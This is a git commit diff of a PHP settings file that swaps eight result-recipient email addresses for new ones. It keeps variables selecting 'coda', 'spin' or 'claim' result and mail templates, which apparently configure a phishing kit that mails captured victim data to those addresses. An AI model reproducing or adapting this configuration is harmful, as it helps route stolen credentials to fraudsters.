39b7ae963484343c9e76a135aebd04ccca9f512a
dilgosting <hgratis76@gmail.com>
2024-07-20 14:27:57 +0800

    Update setting.php

--- setting.php
+++ setting.php
@@ -1,12 +1,12 @@
 <?php
-$email1 = 'stokrenznesia12@gmail.com';
-$email2 = 'stokrenznesia12@gmail.com';
-$email3 = 'stokrenznesia12@gmail.com';
-$email4 = 'stokrenznesia12@gmail.com';
-$email5 = 'stokrenznesia12@gmail.com';
-$email6 = 'stokrenznesia12@gmail.com';
-$email7 = 'stokrenznesia12@gmail.com';
-$email8 = 'stokrenznesia12@gmail.com';
+$email1 = 'yakesihan09@gmail.com';
+$email2 = 'yakesihan09@gmail.com';
+$email3 = 'yakesihan09@gmail.com';
+$email4 = 'yakesihan09@gmail.com';
+$email5 = 'yakesihan09@gmail.com';
+$email6 = 'yakesihan09@gmail.com';
+$email7 = 'yakesihan09@gmail.com';
+$email8 = 'yakesihan09@gmail.com';
 $jenisress = $coda; //$coda, $spin, $claim
 $jenismail = $coda_mail; //$coda_mail, $spin_mail, $claim_mail
 ?>
